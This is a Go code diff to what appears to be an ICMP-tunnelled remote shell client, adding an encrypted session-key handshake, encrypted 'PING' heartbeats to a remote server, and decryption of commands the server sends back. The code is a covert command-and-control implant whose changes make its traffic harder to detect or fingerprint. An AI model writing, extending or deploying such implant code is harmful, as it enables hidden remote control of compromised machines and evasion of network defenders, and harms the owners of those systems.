@@ -85,14 +85,64 @@ func NewShell(ip net.IP, opts ...Option) (*Shell, error) {
 }
 
 func (s *Shell) Handshake() error {
-	// Send token to server
-	// Client sends Echo Request
-	err := s.SendICMP(s.Token, s.icmpId, ipv4.ICMPTypeEcho)
+	// Generate Session Key
+	key, err := s.GenerateSessionKey()
 	if err != nil {
 		return err
 	}
 
-	return nil
+	// Prepare payload: "KEY:" + key
+	payload := append([]byte("KEY:"), key...)
+
+	// Encrypt with Token (for initial exchange)
+	encPayload, err := s.EncryptWithToken(payload)
+	if err != nil {
+		return err
+	}
+
+	// Send Echo Request
+	err = s.SendICMP(encPayload, s.icmpId, ipv4.ICMPTypeEcho)
+	if err != nil {
+		return err
+	}
+
+	// Wait for Reply
+	// We need to read from s.conn
+	buf := make([]byte, 1500)
+	s.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	defer s.conn.SetReadDeadline(time.Time{})
+
+	for {
+		n, _, err := s.conn.ReadFrom(buf)
+		if err != nil {
+			return fmt.Errorf("handshake timeout or error: %v", err)
+		}
+
+		msg, err := icmp.ParseMessage(1, buf[:n])
+		if err != nil {
+			continue
+		}
+
+		if msg.Type == ipv4.ICMPTypeEchoReply {
+			body, ok := msg.Body.(*icmp.Echo)
+			if !ok {
+				continue
+			}
+			if body.ID != int(s.icmpId) {
+				continue
+			}
+
+			// Try to decrypt with Session Key (expecting KEY_OK)
+			// Temporarily set session key to verify
+			s.SetSessionKey(key)
+			decData, err := s.Decrypt(body.Data)
+			if err == nil && string(decData) == "KEY_OK" {
+				// Success!
+				fmt.Println("Handshake success, session key established.")
+				return nil
+			}
+		}
+	}
 }
 
 func (s *Shell) SendICMP(payload []byte, icmpId uint16, icmpType ipv4.ICMPType) error {
@@ -186,15 +236,12 @@ func (s *Shell) ListenICMP() {
 		select {
 		case <-ticker.C:
 			// Send heartbeat/poll
-			// Use lastOutput as payload so server knows we are just keeping alive or retrying last result
-			// If lastOutput was huge, maybe we should just send Token or Empty?
-			// Let's send Token to be safe and small.
-			// But if we send Token, Server might treat it as Handshake again?
-			// Server logic: if payload == Token -> Handshake.
-			// If we send Token, Server replies with pending command.
-			// So sending Token is fine.
-			// fmt.Println("Sending heartbeat...")
-			err := s.SendICMP(s.Token, s.icmpId, ipv4.ICMPTypeEcho)
+			// Encrypt "PING" with session key
+			ping, err := s.Encrypt([]byte("PING"))
+			if err != nil {
+				continue
+			}
+			err = s.SendICMP(ping, s.icmpId, ipv4.ICMPTypeEcho)
 			if err != nil {
 				fmt.Println("Heartbeat error:", err)
 			}
@@ -208,15 +255,14 @@ func (s *Shell) ListenICMP() {
 				continue
 			}
 
-			// Check if data is Token (Heartbeat/KeepAlive from Server)
-			// Must check BEFORE Decrypt because Decrypt(Token) will succeed but produce garbage
-			if bytes.Equal(s.Token, data) {
-				continue
-			}
-
 			// Decrypt data
 			commandDecrypt, err := s.Decrypt(data)
 			if err != nil {
+				continue
+			}
+
+			// Check for PING (Reflection)
+			if string(commandDecrypt) == "PING" {
 				continue
 			}
 
